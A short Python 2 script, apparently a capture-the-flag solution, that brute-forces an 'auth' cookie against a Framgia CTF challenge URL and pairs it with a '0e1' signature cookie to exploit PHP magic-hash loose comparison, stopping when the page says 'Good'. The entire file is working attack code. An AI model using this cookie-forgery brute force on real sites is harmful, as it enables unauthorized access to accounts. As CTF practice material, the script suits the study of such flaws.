import requests


def test(s):
    url = "http://chall3.ctf.framgia.vn/"
    #url = "http://localhost/guruws/fr.php"
    mycookies = {'auth':'framgia2016'+s, 'sign':'0e1'}

    r = requests.post(url, cookies=mycookies)
    print r.text
    return r.text

for i in range(0, 1000000):
    print i
    if 'Good' in test(str(i)):
        print "ok"
        exit()